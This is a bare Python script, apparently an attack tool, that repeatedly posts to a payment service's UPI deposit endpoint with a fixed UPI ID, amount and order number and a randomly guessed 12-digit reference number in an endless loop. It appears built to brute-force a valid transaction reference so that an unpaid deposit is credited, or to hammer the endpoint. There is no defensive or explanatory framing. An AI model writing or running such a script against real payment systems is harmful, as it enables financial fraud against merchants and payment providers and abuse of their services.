import requests,random

url = 'https://in-g1.kirinpayment.cc/cashier/superUpiDeposit'
while True:
    data = {
        'UPI': 'shaix007@icici',
        'Transfer_amount':'260.00',
        'order_no': '2559778758701617152',
        'ref_no': str(random.randint(100000000000,999999999999))
    }
    print(data)
    response = requests.post(url, data = data).text
    print(response)
